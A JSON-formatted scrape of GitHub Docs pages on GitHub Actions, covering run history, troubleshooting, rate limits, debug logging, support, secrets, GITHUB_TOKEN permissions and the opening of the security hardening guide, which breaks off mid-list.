    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/monitoring-workflows/viewing-workflow-run-history",
    "content": [
      {
        "type": "paragraph",
        "text": "Read access to the repository is required to perform these steps."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the repository.",
          "Under your repository name, clickActions.",
          "In the left sidebar, click the workflow you want to see.",
          "From the list of workflow runs, click the name of the run to see the workflow run summary."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "To learn more about GitHub CLI, seeAbout GitHub CLI."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing recent workflow runs"
      },
      {
        "type": "paragraph",
        "text": "To list the recent workflow runs, use therun listsubcommand."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run list"
      },
      {
        "type": "paragraph",
        "text": "To specify the maximum number of runs to return, you can use the-Lor--limitflag . The default is10."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run list --limit 5"
      },
      {
        "type": "paragraph",
        "text": "To only return runs for the specified workflow, you can use the-wor--workflowflag. Replaceworkflowwith either the workflow name, workflow ID, or workflow file name. For example,\"Link Checker\",1234567, or\"link-check-test.yml\"."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run list --workflow WORKFLOW"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing details for a specific workflow run"
      },
      {
        "type": "paragraph",
        "text": "To display details for a specific workflow run, use therun viewsubcommand. Replacerun-idwith the ID of the run that you want to view. If you don't specify arun-id, GitHub CLI returns an interactive menu for you to choose a recent run."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run view RUN_ID"
      },
      {
        "type": "paragraph",
        "text": "To include job steps in the output, use the-vor--verboseflag."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run view RUN_ID --verbose"
      },
      {
        "type": "paragraph",
        "text": "To view details for a specific job in the run, use the-jor--jobflag. Replacejob-idwith the ID of the job that you want to view."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run view --job JOB_ID"
      },
      {
        "type": "paragraph",
        "text": "To view the full log for a job, use the--logflag."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run view --job JOB_ID --log"
      },
      {
        "type": "paragraph",
        "text": "Use the--exit-statusflag to exit with a non-zero status if the run failed. For example:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh run view 0451 --exit-status && echo \"run pending or passed\""
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/about-troubleshooting-workflows",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Troubleshooting your workflows"
      },
      {
        "type": "paragraph",
        "text": "There are several ways you can troubleshoot failed workflow runs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using GitHub Copilot"
      },
      {
        "type": "paragraph",
        "text": "If a workflow run fails, you can open a chat with GitHub Copilot for assistance resolving the error. SeeUsing Copilot to troubleshoot workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Using workflow run logs"
      },
      {
        "type": "paragraph",
        "text": "Each workflow run generates activity logs that you can view, search, and download. For more information, seeUsing workflow run logs."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Enabling debug logging"
      },
      {
        "type": "paragraph",
        "text": "If the workflow logs do not provide enough detail to diagnose why a workflow, job, or step is not working as expected, you can enable additional debug logging. For more information, seeEnabling debug logging."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Canceling a workflow"
      },
      {
        "type": "paragraph",
        "text": "If you attempt to cancel a workflow and the cancellation doesn't succeed, make sure you aren't using thealwaysexpression. Thealwaysexpression causes a workflow step to run even when the workflow is canceled, which results in a hanging cancellation. For more information, seeEvaluate expressions in workflows and actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Troubleshooting GitHub Actions inefficiencies"
      },
      {
        "type": "paragraph",
        "text": "To analyze the inefficiencies and reliability of your workflows using metrics, seeViewing GitHub Actions metrics."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Troubleshooting self-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "If you use self-hosted runners, you can view their activity and diagnose common issues."
      },
      {
        "type": "paragraph",
        "text": "For more information, seeMonitoring and troubleshooting self-hosted runners."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/actions-limits",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Limits in GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "You may be rate limited by GitHub Actions when you scale your usage. Some limits can be increased by contacting us through theGitHub Support portal."
      },
      {
        "type": "paragraph",
        "text": "Unless otherwise stated, the expected behaviour when a limit is reached is that the workflow/job will get cancelled."
      },
      {
        "type": "paragraph",
        "text": "These limits are subject to change."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Existing system limits"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Commonly hit dependent service limits"
      },
      {
        "type": "paragraph",
        "text": "GitHub'sREST API rate limitsapply to GitHub Actions users, those that are commonly hit are:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Unauthenticated users- You can make unauthenticated requests if you are only fetching public data. Unauthenticated requests are associated with the originating IP address, not with the user or application that made the request.The primary rate limit for unauthenticated requests is 60 requests per hour.",
          "Authenticated users- You can use a personal access token to make API requests. Additionally, you can authorize a GitHub App or OAuth app, which can then make API requests on your behalf.All of these requests count towards your personal rate limit of 5,000 requests per hour. Requests made on your behalf by a GitHub App that is owned by a GitHub Enterprise Cloud organization have a higher rate limit of 15,000 requests per hour. Similarly, requests made on your behalf by a OAuth app that is owned or approved by a GitHub Enterprise Cloud organization have a higher rate limit of 15,000 requests per hour if you are a member of the GitHub Enterprise Cloud organization.",
          "GitHub app installations- GitHub Apps authenticating with an installation access token use the installation's minimum rate limit of 5,000 requests per hour. If the installation is on a GitHub Enterprise Cloud organization, the installation has a rate limit of 15,000 requests per hour.For installations that are not on a GitHub Enterprise Cloud organization, the rate limit for the installation will scale with the number of users and repositories. Installations that have more than 20 repositories receive another 50 requests per hour for each repository. Installations that are on an organization that have more than 20 users receive another 50 requests per hour for each user. The rate limit cannot increase beyond 12,500 requests per hour.Primary rate limits for GitHub App user access tokens (as opposed to installation access tokens) are dictated by the primary rate limits for the authenticated user. This rate limit is combined with any requests that another GitHub App or OAuth app makes on that user's behalf and any requests that the user makes with a personal access token. For more information, seeRate limits for the REST API.",
          "OAuth apps -For these requests, the rate limit is 5,000 requests per hour per OAuth app. If the app is owned by a GitHub Enterprise Cloud organization, the rate limit is 15,000 requests per hour.",
          "GITHUB TOKEN- The rate limit forGITHUB_TOKENis 1,000 requests per hour per repository. For requests to resources that belong to a GitHub Enterprise Cloud account, the limit is 15,000 requests per hour per repository.",
          "Secondary rate limits- In addition to primary rate limits, GitHub enforces secondary rate limits in order to prevent abuse and keep the API available for all users, these are not configurable with GHEC. For more information, seeRate limits for the REST API."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/enabling-debug-logging",
    "content": [
      {
        "type": "paragraph",
        "text": "These extra logs are enabled by setting secrets or variables in the repository containing the workflow, so the same permissions requirements will apply:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "To create secrets or variables on GitHub for a personal account repository, you must be the repository owner. To create secrets or variables on GitHub for an organization repository, you must haveadminaccess. Lastly, to create secrets or variables for a personal account repository or an organization repository through the REST API, you must have collaborator access.",
          "To create secrets or variables for an environment in a personal account repository, you must be the repository owner. To create secrets or variables for an environment in an organization repository, you must haveadminaccess. For more information on environments, seeManaging environments for deployment.",
          "Organization owners can create secrets or variables at the organization level."
        ]
      },
      {
        "type": "paragraph",
        "text": "For more information on setting secrets and variables, seeUsing secrets in GitHub ActionsandStore information in variables."
      },
      {
        "type": "paragraph",
        "text": "Additionally, anyone who has access to run a workflow can enable runner diagnostic logging and step debug logging for a workflow re-run. For more information, seeRe-running workflows and jobs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Enabling runner diagnostic logging"
      },
      {
        "type": "paragraph",
        "text": "Runner diagnostic logging provides additional log files that contain information about how a runner is executing a job. Two extra log files are added to the log archive:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The runner process log, which includes information about coordinating and setting up runners to execute jobs.",
          "The worker process log, which logs the execution of a job."
        ]
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "To enable runner diagnostic logging, set the following secret or variable in the repository that contains the workflow:ACTIONS_RUNNER_DEBUGtotrue. If both the secret and variable are set, the value of the secret takes precedence over the variable.",
          "To download runner diagnostic logs, download the log archive of the workflow run. The runner diagnostic logs are contained in therunner-diagnostic-logsfolder. For more information on downloading logs, seeUsing workflow run logs."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Enabling step debug logging"
      },
      {
        "type": "paragraph",
        "text": "Step debug logging increases the verbosity of a job's logs during and after a job's execution."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "To enable step debug logging, set the following secret or variable in the repository that contains the workflow:ACTIONS_STEP_DEBUGtotrue. If both the secret and variable are set, the value of the secret takes precedence over the variable.",
          "After setting the secret or variable, more debug events are shown in the step logs. For more information, seeUsing workflow run logs."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/using-copilot-to-troubleshoot-workflows",
    "content": [
      {
        "type": "paragraph",
        "text": "If a workflow run fails, you can open a chat with GitHub Copilot for assistance resolving the error."
      },
      {
        "type": "paragraph",
        "text": "To open a chat about a failed workflow run, you can either:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Next to the failed check in the merge box, click, then clickExplain error.",
          "In the merge box, click on the failed check. At the top of the workflow run summary page, clickExplain error."
        ]
      },
      {
        "type": "paragraph",
        "text": "This opens a chat window with GitHub Copilot, where it will provide instructions to resolve the issue."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you are on a GitHub Copilot Free subscription, this will count towards your monthly chat message limit."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/monitoring-and-troubleshooting-workflows/troubleshooting-workflows/working-with-support-for-github-actions",
    "content": [
      {
        "type": "paragraph",
        "text": "You cancontact GitHub Supportfor assistance with GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Providing diagnostic and troubleshooting information"
      },
      {
        "type": "paragraph",
        "text": "The contents of private and internal repositories are not visible to GitHub Support, so GitHub Support may request additional information to understand the complete context of your inquiry and reproduce any unexpected behavior. You can accelerate the resolution of your inquiry by providing this information when you initially raise a ticket with GitHub Support."
      },
      {
        "type": "paragraph",
        "text": "Some information that GitHub Support will request can include, but is not limited to, the following:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The URL of the workflow run.For example:https://github.com/ORG/REPO/actions/runs/0123456789",
          "The workflow.ymlfile(s) attached to the ticket as.txtfiles. For more information about workflows, seeAbout workflows.",
          "A copy of your workflow run logs for an example workflow run failure. For more information about workflow run logs, seeUsing workflow run logs.",
          "If you are running this workflow on a self-hosted runner, self-hosted runner logs which can be found under the_diagfolder within the runner. For more information about self-hosted runners, seeMonitoring and troubleshooting self-hosted runners.Self-hosted runner log file names are be formatted:Runner_YYYY####-xxxxxx-utc.logandWorker_YYYY####-xxxxxx-utc.log."
        ]
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Attach files to your support ticket by changing the file's extension to.txtor.zip. If you include textual data such as log or workflow file snippets inline in your ticket, ensure they are formatted correctly as Markdown code blocks. For more information about proper Markdown formatting, seeBasic writing and formatting syntax."
      },
      {
        "type": "paragraph",
        "text": "If the information you provide is unreadable due to the loss of formatting by improper Markdown syntax, GitHub Support may request that resubmit the information either as an attachment or with the correct Markdown formatting."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "Ensure all files and text provided to GitHub Support have been properly redacted to remove sensitive information such as tokens and other secrets."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Ephemeral Runner Application Log Files"
      },
      {
        "type": "paragraph",
        "text": "GitHub Support may request the runner application log files from ephemeral runners. GitHub expects and recommends that you have implemented a mechanism to forward and preserve the runner application log files from self-hosted ephemeral runners. For more information about runner application log files and troubleshooting self-hosted runners, seeMonitoring and troubleshooting self-hosted runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Actions Runner Controller"
      },
      {
        "type": "paragraph",
        "text": "If you are using Actions Runner Controller (ARC), GitHub Support may ask you to submit the complete logs for the controller, listeners, and runner pods. For more information about collecting Actions Runner Controller's logs, seeTroubleshooting Actions Runner Controller errors."
      },
      {
        "type": "paragraph",
        "text": "For more information about the scope of support for Actions Runner Controller, seeAbout support for Actions Runner Controller."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "CodeQL and GitHub Actions"
      },
      {
        "type": "paragraph",
        "text": "If you are requesting assistance with a CodeQL analysis workflow, GitHub Support may request a copy of the CodeQL debugging artifacts. For more information about debugging artifacts for a CodeQL analysis workflow, seeLogs are not detailed enough."
      },
      {
        "type": "paragraph",
        "text": "To provide the debugging artifacts to GitHub Support, please download the CodeQL debugging artifacts from a sample workflow run and attach it to your ticket as a.zipfile. For more information on downloading workflow artifacts, seeDownloading workflow artifacts."
      },
      {
        "type": "paragraph",
        "text": "If the CodeQL debugging artifacts.zipfile is too large to upload to the ticket, please advise GitHub Support, and we will work with you to determine the next steps."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Scope of support"
      },
      {
        "type": "paragraph",
        "text": "If your support request is outside of the scope of what our team can help you with, we may recommend next steps to resolve your issue outside of GitHub Support. Your support request is possibly out of GitHub Support's scope if the request is primarily about:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Third party integrations, such as Jira",
          "CI/CD, such as Jenkins",
          "Writing scripts",
          "Configuration of external authentication systems, such as SAML identity providers",
          "Open source projects",
          "Writing or debugging new queries for CodeQL",
          "Cloud provider configurations, such as virtual network setup, custom firewall, or proxy rules",
          "Container orchestration, such as Kubernetes setup, or networking",
          "Detailed assistance with workflows and data management",
          "Preview features. Public preview and private preview features are out of GitHub Support's scope."
        ]
      },
      {
        "type": "paragraph",
        "text": "For detailed assistance with workflows and data management, consultGitHub Expert Services, which offer specialized support to help you optimize your use of the platform."
      },
      {
        "type": "paragraph",
        "text": "If you're uncertain if the issue is out of scope, open a ticket and we're happy to help you determine the best way to proceed."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/about-secrets",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About secrets"
      },
      {
        "type": "paragraph",
        "text": "Secrets allow you to store sensitive information in your organization, repository, or repository environments. Secrets are variables that you create to use in GitHub Actions workflows in an organization, repository, or repository environment."
      },
      {
        "type": "paragraph",
        "text": "GitHub Actions can only read a secret if you explicitly include the secret in a workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Naming your secrets"
      },
      {
        "type": "paragraph",
        "text": "Tip"
      },
      {
        "type": "paragraph",
        "text": "To help ensure that GitHub redacts your secrets in logs correctly, avoid using structured data as the values of secrets."
      },
      {
        "type": "paragraph",
        "text": "The following rules apply to secret names:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Can only contain alphanumeric characters ([a-z],[A-Z],[0-9]) or underscores (_). Spaces are not allowed.",
          "Must not start with theGITHUB_prefix.",
          "Must not start with a number.",
          "Are case insensitive.",
          "Must be unique to the repository, organization, or enterprise where they are created."
        ]
      },
      {
        "type": "paragraph",
        "text": "If a secret with the same name exists at multiple levels, the secret at the lowest level takes precedence. For example, if an organization-level secret has the same name as a repository-level secret, then the repository-level secret takes precedence. Similarly, if an organization, repository, and environment all have a secret with the same name, the environment-level secret takes precedence."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using your secrets in workflows"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "If a secret is used in a workflow job, GitHub automatically redacts secrets printed to the log. You should avoid printing secrets to the log intentionally."
      },
      {
        "type": "paragraph",
        "text": "Organization-level secrets let you share secrets between multiple repositories, which reduces the need for creating duplicate secrets. Updating an organization secret in one location also ensures that the change takes effect in all repository workflows that use that secret."
      },
      {
        "type": "paragraph",
        "text": "For environment secrets, you can enable required reviewers to control access to the secrets. A workflow job cannot access environment secrets until approval is granted by required approvers."
      },
      {
        "type": "paragraph",
        "text": "To make a secret available to an action, you must set the secret as an input or environment variable in your workflow file. Review the action's README file to learn about which inputs and environment variables the action expects. SeeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Organization and repository secrets are read when a workflow run is queued, and environment secrets are read when a job referencing the environment starts."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Limiting credential permissions"
      },
      {
        "type": "paragraph",
        "text": "When generating credentials, we recommend that you grant the minimum permissions possible. For example, instead of using personal credentials, usedeploy keysor a service account. Consider granting read-only permissions if that's all that is needed, and limit access as much as possible."
      },
      {
        "type": "paragraph",
        "text": "When generating a personal access token (classic), select the fewest scopes necessary. When generating a fine-grained personal access token, select the minimum permissions and repository access required."
      },
      {
        "type": "paragraph",
        "text": "Instead of using a personal access token, consider using a GitHub App, which uses fine-grained permissions and short lived tokens, similar to a fine-grained personal access token. Unlike a personal access token, a GitHub App is not tied to a user, so the workflow will continue to work even if the user who installed the app leaves your organization. For more information, seeMaking authenticated API requests with a GitHub App in a GitHub Actions workflow."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Using secrets in GitHub Actions",
          "REST API endpoints for GitHub Actions Secrets"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About theGITHUB_TOKENsecret"
      },
      {
        "type": "paragraph",
        "text": "At the start of each workflow job, GitHub automatically creates a uniqueGITHUB_TOKENsecret to use in your workflow. You can use theGITHUB_TOKENto authenticate in the workflow job."
      },
      {
        "type": "paragraph",
        "text": "When you enable GitHub Actions, GitHub installs a GitHub App on your repository. TheGITHUB_TOKENsecret is a GitHub App installation access token. You can use the installation access token to authenticate on behalf of the GitHub App installed on your repository. The token's permissions are limited to the repository that contains your workflow. For more information, seePermissions for theGITHUB_TOKEN."
      },
      {
        "type": "paragraph",
        "text": "Before each job begins, GitHub fetches an installation access token for the job. TheGITHUB_TOKENexpires when a job finishes or after a maximum of 24 hours."
      },
      {
        "type": "paragraph",
        "text": "The token is also available in thegithub.tokencontext. For more information, seeAccessing contextual information about workflow runs."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using theGITHUB_TOKENin a workflow"
      },
      {
        "type": "paragraph",
        "text": "You can use theGITHUB_TOKENby using the standard syntax for referencing secrets:${{ secrets.GITHUB_TOKEN }}. Examples of using theGITHUB_TOKENinclude passing the token as an input to an action, or using it to make an authenticated GitHub API request."
      },
      {
        "type": "paragraph",
        "text": "Important"
      },
      {
        "type": "paragraph",
        "text": "An action can access theGITHUB_TOKENthrough thegithub.tokencontext even if the workflow does not explicitly pass theGITHUB_TOKENto the action. As a good security practice, you should always make sure that actions only have the minimum access they require by limiting the permissions granted to theGITHUB_TOKEN. For more information, seePermissions for theGITHUB_TOKEN."
      },
      {
        "type": "paragraph",
        "text": "When you use the repository'sGITHUB_TOKENto perform tasks, events triggered by theGITHUB_TOKEN, with the exception ofworkflow_dispatchandrepository_dispatch, will not create a new workflow run. This prevents you from accidentally creating recursive workflow runs. For example, if a workflow run pushes code using the repository'sGITHUB_TOKEN, a new workflow will not run even when the repository contains a workflow configured to run whenpushevents occur."
      },
      {
        "type": "paragraph",
        "text": "Commits pushed by a GitHub Actions workflow that uses theGITHUB_TOKENdo not trigger a GitHub Pages build."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example 1: passing theGITHUB_TOKENas an input"
      },
      {
        "type": "paragraph",
        "text": "This example workflow uses theGitHub CLI, which requires theGITHUB_TOKENas the value for theGH_TOKENinput parameter:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Open new issue\non: workflow_dispatch\n\njobs:\n  open-issue:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      issues: write\n    steps:\n      - run: |\n          gh issue --repo ${{ github.repository }} \\\n            create --title \"Issue title\" --body \"Issue body\"\n        env:\n          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Example 2: calling the REST API"
      },
      {
        "type": "paragraph",
        "text": "You can use theGITHUB_TOKENto make authenticated API calls. This example workflow creates an issue using the GitHub REST API:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Create issue on commit\n\non: [ push ]\n\njobs:\n  create_issue:\n    runs-on: ubuntu-latest\n    permissions:\n      issues: write\n    steps:\n      - name: Create issue using REST API\n        run: |\n          curl --request POST \\\n          --url https://api.github.com/repos/${{ github.repository }}/issues \\\n          --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \\\n          --header 'content-type: application/json' \\\n          --data '{\n            \"title\": \"Automated issue for commit: ${{ github.sha }}\",\n            \"body\": \"This issue was automatically created by the GitHub Action workflow **${{ github.workflow }}**. \\n\\n The commit hash was: _${{ github.sha }}_.\"\n            }' \\\n          --fail"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Permissions for theGITHUB_TOKEN"
      },
      {
        "type": "paragraph",
        "text": "For information about the API endpoints GitHub Apps can access with each permission, seePermissions required for GitHub Apps."
      },
      {
        "type": "paragraph",
        "text": "The following table shows the permissions granted to theGITHUB_TOKENby default. People with admin permissions to an enterprise, organization, or repository, can set the default permissions to be either permissive or restricted. For information on how to set the default permissions for theGITHUB_TOKENfor your enterprise, organization, or repository, seeEnforcing policies for GitHub Actions in your enterprise,Disabling or limiting GitHub Actions for your organization, orManaging GitHub Actions settings for a repository."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "When a workflow is triggered by thepull_request_targetevent, theGITHUB_TOKENis granted read/write repository permission, even when it is triggered from a public fork. For more information, seeEvents that trigger workflows.",
          "Private repositories can control whether pull requests from forks can run workflows, and can configure the permissions assigned toGITHUB_TOKEN. For more information, seeManaging GitHub Actions settings for a repository.",
          "Workflow runs triggered by Dependabot pull requests run as if they are from a forked repository, and therefore use a read-onlyGITHUB_TOKEN. These workflow runs cannot access any secrets. For information about strategies to keep these workflows secure, seeSecurity hardening for GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Modifying the permissions for theGITHUB_TOKEN"
      },
      {
        "type": "paragraph",
        "text": "You can modify the permissions for theGITHUB_TOKENin individual workflow files. If the default permissions for theGITHUB_TOKENare restrictive, you may have to elevate the permissions to allow some actions and commands to run successfully. If the default permissions are permissive, you can edit the workflow file to remove some permissions from theGITHUB_TOKEN. As a good security practice, you should grant theGITHUB_TOKENthe least required access."
      },
      {
        "type": "paragraph",
        "text": "You can see the permissions thatGITHUB_TOKENhad for a specific job in the \"Set up job\" section of the workflow run log. For more information, seeUsing workflow run logs."
      },
      {
        "type": "paragraph",
        "text": "You can use thepermissionskey in your workflow file to modify permissions for theGITHUB_TOKENfor an entire workflow or for individual jobs. This allows you to configure the minimum required permissions for a workflow or job."
      },
      {
        "type": "paragraph",
        "text": "You can use thepermissionskey to add and remove read permissions for forked repositories, but typically you can't grant write access. The exception to this behavior is where an admin user has selected theSend write tokens to workflows from pull requestsoption in the GitHub Actions settings. For more information, seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "paragraph",
        "text": "The two workflow examples earlier in this article show thepermissionskey being used at the job level, as it is best practice to limit the permissions' scope."
      },
      {
        "type": "paragraph",
        "text": "For full details of thepermissionskey, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Organization owners can prevent you from granting write access to theGITHUB_TOKENat the repository level. For more information, seeDisabling or limiting GitHub Actions for your organization."
      },
      {
        "type": "paragraph",
        "text": "When thepermissionskey is used, all unspecified permissions are set to no access, with the exception of themetadatascope, which always gets read access."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "How the permissions are calculated for a workflow job"
      },
      {
        "type": "paragraph",
        "text": "The permissions for theGITHUB_TOKENare initially set to the default setting for the enterprise, organization, or repository. If the default is set to the restricted permissions at any of these levels then this will apply to the relevant repositories. For example, if you choose the restricted default at the organization level then all repositories in that organization will use the restricted permissions as the default. The permissions are then adjusted based on any configuration within the workflow file, first at the workflow level and then at the job level. Finally, if the workflow was triggered by a pull request from a forked repository, and theSend write tokens to workflows from pull requestssetting is not selected, the permissions are adjusted to change any write permissions to read only."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Granting additional permissions"
      },
      {
        "type": "paragraph",
        "text": "If you need a token that requires permissions that aren't available in theGITHUB_TOKEN, you can create a GitHub App and generate an installation access token within your workflow. For more information, seeMaking authenticated API requests with a GitHub App in a GitHub Actions workflow. Alternatively, you can create a personal access token, store it as a secret in your repository, and use the token in your workflow with the${{ secrets.SECRET_NAME }}syntax. For more information, seeManaging your personal access tokensandUsing secrets in GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Rate limits for the REST API"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview"
      },
      {
        "type": "paragraph",
        "text": "This guide explains how to configure security hardening for certain GitHub Actions features. If the GitHub Actions concepts are unfamiliar, seeUnderstanding GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Using secrets"
      },
      {
        "type": "paragraph",
        "text": "Sensitive values should never be stored as plaintext in workflow files, but rather as secrets.Secretscan be configured at the organization, repository, or environment level, and allow you to store sensitive information in GitHub."
      },
      {
        "type": "paragraph",
        "text": "Secrets useLibsodium sealed boxes, so that they are encrypted before reaching GitHub. This occurs when the secret is submittedusing the UIor through theREST API. This client-side encryption helps minimize the risks related to accidental logging (for example, exception logs and request logs, among others) within GitHub's infrastructure. Once the secret is uploaded, GitHub is then able to decrypt it so that it can be injected into the workflow runtime."
      },
      {
        "type": "paragraph",
        "text": "To help prevent accidental disclosure, GitHub uses a mechanism that attempts to redact any secrets that appear in run logs. This redaction looks for exact matches of any configured secrets used within the job, as well as common encodings of the values, such as Base64. However, because there are multiple ways a secret value can be transformed, this redaction is not guaranteed. Additionally, the runner can only redact secrets used within the current job. As a result, there are certain proactive steps and good practices you should follow to help ensure secrets are redacted, and to limit other risks associated with secrets:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Never use structured data as a secretStructured data can cause secret redaction within logs to fail, because redaction largely relies on finding an exact match for the specific secret value. For example, do not use a blob of JSON, XML, or YAML (or similar) to encapsulate a secret value, as this significantly reduces the probability the secrets will be properly redacted. Instead, create individual secrets for each sensitive value.",
          "Structured data can cause secret redaction within logs to fail, because redaction largely relies on finding an exact match for the specific secret value. For example, do not use a blob of JSON, XML, or YAML (or similar) to encapsulate a secret value, as this significantly reduces the probability the secrets will be properly redacted. Instead, create individual secrets for each sensitive value.",
          "Register all secrets used within workflowsIf a secret is used to generate another sensitive value within a workflow, that generated value should be formallyregistered as a secret, so that it will be redacted if it ever appears in the logs. For example, if using a private key to generate a signed JWT to access a web API, be sure to register that JWT as a secret or else it won’t be redacted if it ever enters the log output.Registering secrets applies to any sort of transformation/encoding as well. If your secret is transformed in some way (such as Base64 or URL-encoded), be sure to register the new value as a secret too.",
          "If a secret is used to generate another sensitive value within a workflow, that generated value should be formallyregistered as a secret, so that it will be redacted if it ever appears in the logs. For example, if using a private key to generate a signed JWT to access a web API, be sure to register that JWT as a secret or else it won’t be redacted if it ever enters the log output.",
          "Registering secrets applies to any sort of transformation/encoding as well. If your secret is transformed in some way (such as Base64 or URL-encoded), be sure to register the new value as a secret too.",
          "Audit how secrets are handledAudit how secrets are used, to help ensure they’re being handled as expected. You can do this by reviewing the source code of the repository executing the workflow, and checking any actions used in the workflow. For example, check that they’re not sent to unintended hosts, or explicitly being printed to log output.View the run logs for your workflow after testing valid/invalid inputs, and check that secrets are properly redacted, or not shown. It's not always obvious how a command or tool you’re invoking will send errors toSTDOUTandSTDERR, and secrets might subsequently end up in error logs. As a result, it is good practice to manually review the workflow logs after testing valid and invalid inputs. For information on how to clean up workflow logs that may unintentionally contain sensitive data, seeUsing workflow run logs.",
          "Audit how secrets are used, to help ensure they’re being handled as expected. You can do this by reviewing the source code of the repository executing the workflow, and checking any actions used in the workflow. For example, check that they’re not sent to unintended hosts, or explicitly being printed to log output.",
          "View the run logs for your workflow after testing valid/invalid inputs, and check that secrets are properly redacted, or not shown. It's not always obvious how a command or tool you’re invoking will send errors toSTDOUTandSTDERR, and secrets might subsequently end up in error logs. As a result, it is good practice to manually review the workflow logs after testing valid and invalid inputs. For information on how to clean up workflow logs that may unintentionally contain sensitive data, seeUsing workflow run logs.",
